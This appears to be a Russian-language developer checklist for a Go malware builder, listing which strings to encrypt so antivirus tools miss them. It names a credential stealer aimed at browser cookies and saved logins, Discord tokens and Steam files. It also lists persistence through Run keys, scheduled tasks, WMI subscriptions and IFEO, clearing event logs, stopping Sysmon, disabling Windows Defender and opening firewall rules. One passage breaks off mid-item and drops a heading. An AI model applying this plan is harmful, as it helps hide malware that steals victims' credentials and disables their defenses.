# ЧТО НУЖНО ЗАШИФРОВАТЬ В AGGRESSIVE MODE

## КРИТИЧНО - STEALER (template_stealer.go)

### Профили браузеров (строки 111, 221)
- "Default"
- "Profile 1"
- "Profile 2"
- "Profile 3"
- "Profile 4"
- "Profile 5"

### Пути браузеров (строки 115-120, 225-230)
- "Network"
- "Cookies"
- "Login Data"
- "Local Storage"
- "leveldb"
- "Local State"

### Файлы Firefox (строка 310)
- "cookies.sqlite"

### Форматы вывода логинов (строки 270-272)
- "URL: "
- "Login: "
- "Password: "

### Форматы вывода userinfo (строки 420-427)
- "Hostname: "
- "Username: "
- "IP: "
- "Country: "
- "OS: "
- "CPU: "
- "GPU: "
- "RAM: "

### PowerShell аргументы (строки 408-410)
- "-NoProfile"
- "-Command"

### Размер RAM (строка 416)
- " GB"

### Метки (строки 272, 365)
- "(encrypted)"

### Steam пути (строки 500-505)
- "Steam"
- "D:\\steam"
- "C:\\Steam"
- "ProgramFiles(x86)"
- "ProgramFiles"

### Steam файлы (строки 520-525)
- "config"
- "config.vdf"
- "loginusers.vdf"
- "SteamAppData.vdf"

### Discord пути (строки 560-565)
- "Local Storage"
- "leveldb"
- "Local State"

### Discord маркеры (строки 580, 640-645)
- "dQw4w9WgXcQ:"
- "v10"
- "mfa."

### Discord расширения файлов (строки 595-600)
- ".ldb"
- ".log"

## ВЫСОКИЙ ПРИОРИТЕТ - PROCESS (template_process.go)

### Пути установки (строки 25, 95, 100)
- "Microsoft"
- "Windows"
- "Start Menu"
- "Programs"
- "Startup"

### Расширения (строка 155)
- ".EXE"
- ".exe"

### Системные пути (строка 50)
- "SystemRoot"
- "System32"
- "notepad.exe"

### Имена кандидатов маскировки (строки 60-65)
- "SystemAppData"
- "CloudStore"
- "IdentityService"
- "DeviceMetadataStore"

### Registry пути (строки 180, 240)
- "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

### Shortcut расширение (строка 250)
- ".lnk"

## СРЕДНИЙ ПРИОРИТЕТ - ANTIFORENSICS (template_antiforensics.go)

### Системные пути (строки 5, 20)
- "SystemRoot"
- "Prefetch"
- "APPDATA"
- "Microsoft"
- "Windows"
- "Recent"

### Event log имена (строки 35-40)
- "Microsoft-Windows-TaskScheduler/Operational"
- "Microsoft-Windows-Services/Diagnostic"

### PowerShell команды (строки 40-45)
- "-NoProfile"
- "-ExecutionPolicy"
- "Bypass"
- "-WindowStyle"
- "Hidden"
- "-Command"
- "wevtutil sl"
- "/e:false"
- "2>$null"

### Aggressive команды (строки 60-80)
- "wevtutil el"
- "ForEach-Object"
- "wevtutil cl"
- "Stop-Service"
- "Sysmon"
- "Sysmon64"
- "-Force"
- "-ErrorAction"
- "SilentlyContinue"
- "sc.exe config"
- "start=
строки 5, 10)
- "_Filter"
- "_Consumer"

### PowerShell команды (строки 30-35)
- "$f=[wmiclass]"
- "$fi=$f.CreateInstance()"
- "$fi.Name="
- "$fi.EventNamespace="
- "$fi.QueryLanguage="
- "$fi.Query="
- "$fi.Put()"
- "$c=[wmiclass]"
- "$ci=$c.CreateInstance()"
- "$ci.CommandLineTemplate="
- "$b=[wmiclass]"
- "$bi=$b.CreateInstance()"
- "$bi.Filter="
- "$bi.Consumer="

### Check команды (строка 45)
- "Get-WmiObject"
- "-Namespace"
- "-Class"
- "-Filter"
- "Name="
- "-ErrorAction"
- "SilentlyContinue"
- "exit 0"
- "exit 1"

## СРЕДНИЙ ПРИОРИТЕТ - INSTALL_OPS (template_install_ops.go)

### Task имена (строка 10)
- "NvContainerTask_"

### Schtasks аргументы (строки 100-105)
- "/Create"
- "/TN"
- "/TR"
- "/SC"
- "ONLOGON"
- "/RL"
- "HIGHEST"
- "/F"
- "LIMITED"

### Registry пути (строки 115-120)
- "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

### Startup пути (строки 130-135)
- "Microsoft"
- "Windows"
- "Start Menu"
- "Programs"
- "Startup"
- ".lnk"

### PowerShell shortcut команды (строки 145-150)
- "$ws=(New-Object -ComObject WScript.Shell).CreateShortcut("
- "$ws.TargetPath="
- "$ws.Arguments="
- "$ws.WindowStyle=7"
- "$ws.Save()"

### Аргументы (строка 100)
- "worker"

## НИЗКИЙ ПРИОРИТЕТ - BOOT PERSIST (template_boot_persist.go)

### Registry пути (строки 10-15, 30-35)
- "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
- "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

### Префикс (строка 20)
- "!"

### Аргумент (строка 25)
- "worker"

## НИЗКИЙ ПРИОРИТЕТ - IFEO (template_ifeo.go)

### Registry путь (строка 15)
- "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"

### Registry значение (строка 35)
- "Debugger"

### Аргумент (строка 40)
- "worker"

## НИЗКИЙ ПРИОРИТЕТ - FIREWALL (template_firewall.go)

### Netsh команды
- "advfirewall"
- "firewall"
- "add"
- "rule"
- "name="
- "dir=in"
- "action=allow"
- "program="
- "enable=yes"
- "profile=any"

### Суффикс (строка 10)
- " Service"

## НИЗКИЙ ПРИОРИТЕТ - DEFENDER_KILL (template_defender_kill.go)

### PowerShell команды (строки 50-60)
- "Stop-Service"
- "WinDefend"
- "-Force"
- "-ErrorAction"
- "SilentlyContinue"
- "Set-Service"
- "-StartupType"
- "Disabled"
- "Get-ScheduledTask"
- "-TaskPath"
- "\\Microsoft\\Windows\\Windows Defender\\*"
- "Disable-ScheduledTask"

## ДОПОЛНИТЕЛЬНО - ДРУГИЕ ФАЙЛЫ

### template_firewall.go
- Все netsh команды и аргументы

### template_acl_protect.go
- Все icacls команды и аргументы

### template_critical_process.go
- Все системные вызовы

### template_misc.go
- Проверить на строки

### template_runtime.go
- Проверить на строки

### template_download.go
- Проверить на строки

### template_wallpaper.go
- Проверить на строки

### template_rd.go
- Проверить на строки

### template_commands.go
- Проверить на строки

---

## ИТОГО ПРИОРИТЕТЫ:

1. **КРИТИЧНО** - template_stealer.go (профили, пути браузеров, форматы)
2. **ВЫСОКИЙ** - template_process.go (пути установки, маскировка)
3. **СРЕДНИЙ** - template_antiforensics.go, template_wmi_persist.go, template_install_ops.go
4. **НИЗКИЙ** - template_boot_persist.go, template_ifeo.go, template_firewall.go, template_defender_kill.go

## РЕКОМЕНДАЦИЯ:
Начни с КРИТИЧНЫХ строк в template_stealer.go - это самое палевное место!
